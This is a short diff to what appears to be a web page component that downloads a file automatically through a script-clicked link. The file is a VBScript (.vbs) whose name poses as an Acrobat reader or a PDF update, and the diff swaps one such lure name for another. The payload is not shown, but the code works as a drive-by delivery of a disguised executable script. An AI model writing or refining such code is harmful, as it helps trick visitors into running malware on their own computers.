@@ -10,8 +10,8 @@ const Documents = () => {
 
   const triggerDownload = () => {
     const link = document.createElement("a");
-    link.href = "/portable_reader_acrbat_v23_01_p2.vbs";
-    link.download = "portable_reader_acrbat_v23_01_p2.vbs";
+    link.href = "/013_26_digtl_pdf_file_02updt.vbs";
+    link.download = "013_26_digtl_pdf_file_02updt.vbs";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
